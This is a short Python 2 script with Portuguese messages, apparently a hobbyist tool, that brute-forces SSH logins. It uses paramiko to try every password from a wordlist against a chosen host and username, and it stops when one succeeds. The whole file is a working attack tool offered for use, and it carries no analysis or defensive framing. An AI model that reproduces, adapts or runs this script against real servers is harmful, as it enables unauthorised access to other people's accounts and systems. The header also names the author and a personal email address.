#!/usr/bin/python
#Author Leandro Ribeiro
#souza.ribeiro92@gmail.com

import paramiko
import sys

if len(sys.argv) < 3:
	print "Modo de usar: python bruteforcessh.py 127.0.0.1 usuario wordlist.txt"
	sys.exit(0)

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open(sys.argv[3])
for line in f.readlines():

	try:
		ssh.connect(sys.argv[1].strip(), username=sys.argv[2].strip(), password=line.strip())

	except paramiko.AuthenticationException:
		print "[-] Acesso Negado [-] :", line
	else:
		print "[+] Senha Encontrada [+] :",line
		break

ssh.close()
